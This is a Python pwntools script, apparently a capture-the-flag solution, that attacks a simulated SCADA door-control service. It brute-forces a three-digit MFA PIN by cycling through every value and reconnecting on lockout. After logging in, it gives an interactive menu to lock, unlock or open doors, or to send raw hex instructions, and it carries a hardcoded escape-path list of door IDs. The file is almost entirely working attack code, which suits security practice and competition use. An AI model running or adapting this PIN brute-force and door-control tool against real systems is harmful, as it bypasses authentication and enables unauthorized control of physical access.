import sys
import time
import binascii
from pwn import *

#context.log_level = 'error'

ESCAPE_PATH = [
    "0005",
    "0557",
    "4457", #5744
    "4449",
    "4349",
    "3943",
    "3439",
    "3499",
]

DOORS = [
    "1718",
    "0304",
    "1719",
    "1619",
    "1519",
    "0305",
    "0205",
    "0105",
    "1819",
    "1419",
    "0405",
    "1927",
    "0511",
    "1920",
    "0513",
    "1925",
    "1325",
    "0510",
    "2627",
    "1112",
    "1921",
    "0506",
    "1926",
    "2425",
    "0512",
    "0910",
    "1922",
    "1924",
    "0507",
    "0509",
    "1923",
    "0508",
    "1928",
    "1358",
    "2858",
    "5758",
    "2833",
    "4358",
    "3233",
    "4748",
    "3234",
    "3134",
    "3034",
    "4749",
    "4649",
    "4549",
    "3334",
    "2934",
    "4849",
    "3442",
    "4956",
    "3435",
    "3440",
    "4954",
    "4142",
    "5556", # 5655
    "3436",
    "4950",
    "3441",
    "3940",
    "4955",
    "5354", # 5453
    "3437",
    "4951",
    "4953",
    "3438",
    "4952",
]

ALL_DOORS = ESCAPE_PATH + DOORS

STATE_LOCKED = "00"
STATE_UNLOCKED = "01"
STATE_OPEN = "02"

STATE_LABELS = {
    STATE_LOCKED: "Locked",
    STATE_UNLOCKED: "Unlocked",
    STATE_OPEN: "Open",
}

def format_instruction(door_id, state=STATE_OPEN, extra="04"):
    return state + extra + binascii.hexlify(door_id.encode()).decode()

class ScadaClient:
    def __init__(self, host="scada", port="1338", username="Dil8Cruise"):
        self.host = host
        self.port = port
        self.username = username
        self.io = None
        self.menu_title = "MAIN MENU"

    def _handle_welcome(self):
        # Test a few instructions to make sure we have a stable connection
        for door_id in ESCAPE_PATH[:3]:
            self.open_door(door_id)
            r = self.io.recv()
            if b"unable to decode" in r:
                # We were unable to decode the hex-formatted bytes
                return False

        log.info("Logged in!")
        self._handle_input()

    def _print_menu(self):
        print("- 0. Lock doors")
        print("- 1. Unlock doors")
        print("- 2. Open doors")
        print("- 3. Raw instructions")

    def _handle_input(self):
        while True:
            print()
            print(">" * 16, self.menu_title, "<" * 16)
            if self.menu_title == "MAIN MENU":
                self._print_menu()
                item = input("Select an menu item: ").strip()
                if item == "0":
                    self.menu_title = "LOCK DOORS"
                    self.door_state = STATE_LOCKED
                elif item == "1":
                    self.menu_title = "UNLOCK DOORS"
                    self.door_state = STATE_UNLOCKED
                elif item == "2":
                    self.menu_title = "OPEN DOORS"
                    self.door_state = STATE_OPEN
                elif item == "3":
                    self.menu_title = "RAW INSTRUCTIONS"
                else:
                    print("Invalid menu item, try again")
            else:
                print("(press 'q' to go back to the menu)")

                if self.menu_title == "RAW INSTRUCTIONS":
                    instruction = input("Instruction: ").strip().replace("\n", "")

                    if instruction == "q":
                        self.menu_title = "MAIN MENU"
                        continue

                    self.io.send(instruction)
                else:
                    door_id = input("Door ID: ").strip().replace("\n", "")

                    if door_id == "q":
                        self.menu_title = "MAIN MENU"
                        continue

                    if door_id not in ALL_DOORS:
                        print("Door ID is not in the list of door IDs, try again")
                        continue

                    self.set_door_state(door_id, state=self.door_state)

                result = self.io.recv()
                log.debug(result)

                log.info("Done!")

    def set_door_state(self, door_id, state, extra="04"):
        instruction = format_instruction(door_id, state=state, extra=extra)
        log.debug("Setting state of door ID #{} to {} with instruction: {}".format(
            door_id, STATE_LABELS[state].upper(), instruction
        ))
        self.io.send(instruction)

    def open_door(self, door_id):
        self.set_door_state(door_id, state=STATE_OPEN)

    def lock_door(self, door_id):
        self.set_door_state(door_id, state=STATE_LOCKED)

    def unlock_door(self, door_id):
        self.set_door_state(door_id, state=STATE_UNLOCKED)

    def run(self):
        self.is_running = True
        log.info("Starting client, getting a stable connection might take a bit")
        while self.is_running:
            try:
                self.connect()
            except Exception as e:
                print("Exception in client:", e)
                #exit(0)

    def connect(self):
        self.io = remote(self.host, self.port)
        self.io.recvuntil(':')
        self.io.send(self.username)
        self.io.recvuntil(':')

        for i in range(999):
            pin = str(i).zfill(3)
            self.io.sendline(pin)
            data = self.io.recv()

            if b"Welcome back" in data:
                # PIN worked, we are in!
                if not self._handle_welcome():
                    # Something went wrong during the welcome, let's force a reconnect
                    break
            elif b"too many digits" in data:
                # You have entered too many digits for the MFA check
                # Reset connection
                break

            # else: the provided PIN was not correct

        self.io.close()

if len(sys.argv) != 3:
    print("Usage: ./scada_client.py <hostname> <port>")
    print("Example: ./scada_client.py scada 1338")
    exit(1)

client = ScadaClient(sys.argv[1], sys.argv[2])
client.run()
